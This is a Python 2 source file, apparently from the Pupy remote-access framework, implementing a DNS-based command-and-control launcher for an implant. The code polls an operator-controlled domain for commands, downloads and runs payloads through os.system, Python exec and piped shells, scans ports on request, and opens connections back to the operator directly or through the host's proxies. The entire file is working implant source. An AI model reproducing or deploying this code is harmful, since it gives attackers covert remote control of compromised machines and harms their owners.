# -*- coding: utf-8 -*-
# Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)

__all__ = [ 'DNSCommandClientLauncher' ]

from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
from ..picocmd.client import DnsCommandsClient
from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort

from ..proxies import get_proxies

from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError

from ..clients import PupyTCPClient, PupySSLClient
from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient

from ..online import PortQuiz, check
from ..scan import scan

from threading import Thread, Event, Lock

import socket
import os

import subprocess

import tempfile
import platform

import network

from network.lib import getLogger

logger = getLogger('dnscnc')

class DNSCommandClientLauncher(DnsCommandsClient):
    def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
        self.stream = None
        self.commands = []
        self.lock = Lock()
        self.new_commands = Event()

        try:
            from pupy_credentials import DNSCNC_PUB_KEY
            key = DNSCNC_PUB_KEY
        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            key = credentials['DNSCNC_PUB_KEY']

        DnsCommandsClient.__init__(self, domain, key, ns, qtype, ns_timeout=ns_timeout)

    def on_session_established(self):
        import pupy
        if hasattr(pupy, 'infos'):
            pupy.infos['spi'] = '{:08x}'.format(self.spi)

    def on_session_lost(self):
        import pupy

        if hasattr(pupy, 'infos') and 'spi' in pupy.infos:
            del pupy.infos['spi']

    def on_downloadexec_content(self, url, action, content):
        self.on_pastelink_content(url, action, content)

    def on_pastelink_content(self, url, action, content):
        if action.startswith('exec'):
            tmp_path = None

            try:
                fd, tmp_path = tempfile.mkstemp()
                tmp = os.fdopen(fd, 'wb')
                tmp.write(content)
                tmp.close()

                if not platform.system == 'Windows':
                    os.chmod(tmp_path, 0700)

                os.system(tmp_path)

            except Exception as e:
                logger.exception(e)

            finally:
                if tmp_path:
                    os.unlink(tmp_path)

        elif action.startswith('pyexec'):
            try:
                exec content
            except Exception as e:
                logger.exception(e)
        elif action.startswith('sh'):
            try:
                pipe = None
                if platform.system == 'Windows':
                    kwargs = {
                        'stdin': subprocess.PIPE
                    }

                    if hasattr(subprocess, 'STARTUPINFO'):
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= \
                          subprocess.CREATE_NEW_CONSOLE | \
                          subprocess.STARTF_USESHOWWINDOW

                        kwargs.update({
                            'startupinfo': startupinfo,
                        })

                    pipe = subprocess.Popen('cmd.exe', **kwargs)
                else:
                    pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)

                pipe.stdin.write(content)
                pipe.stdin.close()
                pipe.communicate()

            except Exception as e:
                logger.exception(e)

    def _checkconnect_worker(self, host, port_start, port_end):
        ports = xrange(port_start, port_end+1)
        connectable = scan([str(host)], ports)
        while connectable:
            chunk = [ x[1] for x in connectable[:5] ]
            connectable = connectable[5:]
            self.event(ConnectablePort(host, chunk))

    def on_checkconnect(self, host, port_start, port_end):
        worker = Thread(target=self._checkconnect_worker, args=(
            host, port_start, port_end))
        worker.daemon = True
        worker.start()

    def _checkonline_worker(self):
        logger.debug('CheckOnline worker started')
        portquiz = PortQuiz()
        portquiz.start()

        try:
            offset, mintime, register = check()
            logger.debug('OnlineStatus completed: {:04x} {:04x} {:08x}'.format(
                offset, mintime, register))
            self.event(OnlineStatus(offset, mintime, register))
        except Exception, e:
            logger.exception('Online status check failed: {}'.format(e))

        logger.debug('Wait for PortQuiz completion')
        portquiz.join()
        logger.debug('PortQuiz completed')

        try:
            if portquiz.available:
                self.event(PortQuizPort(portquiz.available[:8]))
        except Exception, e:
            logger.exception(e)

        logger.debug('CheckOnline worker completed')

    def on_checkonline(self):
        worker = Thread(target=self._checkonline_worker)
        worker.daemon = True
        worker.start()

    def on_connect(self, ip, port, transport, proxy=None):
        logger.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
        with self.lock:
            if self.stream and not self.stream.closed:
                logger.debug('ignoring connection request. stream = {}'.format(self.stream))
                return

            self.commands.append(('connect', ip, port, transport, proxy))
            self.new_commands.set()

    def on_disconnect(self):
        logger.debug('disconnect request [stream={}]'.format(self.stream))
        with self.lock:
            if self.stream:
                self.stream.close()
                self.stream = None

    def on_exit(self):
        with self.lock:
            if self.stream:
                self.stream.close()

        os._exit(0)

class DNSCncLauncher(BaseLauncher):
    ''' Micro command protocol built over DNS infrastructure '''

    credentials = [ 'DNSCNC_PUB_KEY' ]

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
        super(DNSCncLauncher, self).__init__(*args, **kwargs)

    def init_argparse(self):
        self.arg_parser = LauncherArgumentParser(
            prog='dnscnc', description=self.__doc__
        )

        self.arg_parser.add_argument(
            '--domain',
            metavar='<domain>',
            required=True,
            help='controlled domain (hostname only, no IP, '
               'you should properly setup NS first. Port is NOT supported)'
        )

        self.arg_parser.add_argument(
            '--ns', help='DNS server (will use internal DNS library)'
        )

        self.arg_parser.add_argument(
            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
            default=3, type=int,
        )

        self.arg_parser.add_argument(
            '--qtype',
            choices=['A'], default='A',
            help='DNS query type (For now only A supported)'
        )

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)
        self.set_host(self.args.domain)
        self.set_transport(None)

        self.ns = self.args.ns
        self.ns_timeout = self.args.ns_timeout
        self.qtype = self.args.qtype

    def try_direct_connect(self, command):
        _, host, port, transport, _ = command
        t = network.conf.transports[transport](
            bind_payload=self.connect_on_bind_payload
        )

        client = t.client()
        s = None
        stream = None

        try:
            s = client.connect(host, port)
            stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
        except socket.error as e:
            logger.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
                host, port, transport, e
            ))

        except Exception, e:
            logger.exception(e)

        return stream

    def try_connect_via_proxy(self, command):
        _, host, port, transport, connection_proxy = command
        if connection_proxy is True:
            connection_proxy = None

        for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
               additional_proxies=[connection_proxy] if connection_proxy else None
        ):
            t = network.conf.transports[transport](
                bind_payload=self.connect_on_bind_payload
            )

            if t.client is PupyTCPClient:
                t.client = PupyProxifiedTCPClient
            elif t.client is PupySSLClient:
                t.client = PupyProxifiedSSLClient
            else:
                return

            s = None
            stream = None

            proxy_addr, proxy_port = proxy.rsplit(':', 1)

            try:
                client = t.client(
                    proxy_type=proxy_type.upper(),
                    proxy_addr=proxy_addr,
                    proxy_port=proxy_port,
                    proxy_username=proxy_username,
                    proxy_password=proxy_password
                )

                s = client.connect(host, port)
                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)

            except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
                if proxy_username and proxy_password:
                    proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
                else:
                    proxy_auth = ''

                logger.error('Couldn\'t connect to {}:{} transport: {} '
                                  'via {}://{}{}: {}'.format(
                    host, port, transport,
                    proxy_type, proxy_auth, proxy,
                    e
                ))

            except Exception, e:
                logger.exception(e)

            yield stream


    def iterate(self):
        import pupy

        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        dnscnc = DNSCommandClientLauncher(
            self.host, self.ns, self.qtype, self.ns_timeout)

        dnscnc.daemon = True

        logger.info('Activating CNC protocol. Domain: {}'.format(self.host))
        dnscnc.start()

        exited = False

        while not exited:
            command = None

            with dnscnc.lock:
                if dnscnc.commands:
                    command = dnscnc.commands.pop()
                else:
                    dnscnc.new_commands.clear()

            if not command:
                dnscnc.new_commands.wait()
                continue

            if command[0] == 'connect':
                logger.debug('processing connection command')

                with dnscnc.lock:
                    if command[4]:
                        stream = None
                    else:
                        stream = self.try_direct_connect(command)

                    if not stream:
                        for stream in self.try_connect_via_proxy(command):
                            if stream:
                                break

                    dnscnc.stream = stream

                if stream:
                    logger.debug('stream created, yielding - {}'.format(stream))
                    pupy.infos['transport'] = command[3]

                    yield stream

                    with dnscnc.lock:
                        dnscnc.stream = None

                else:
                    logger.debug('all connection attempt has been failed')
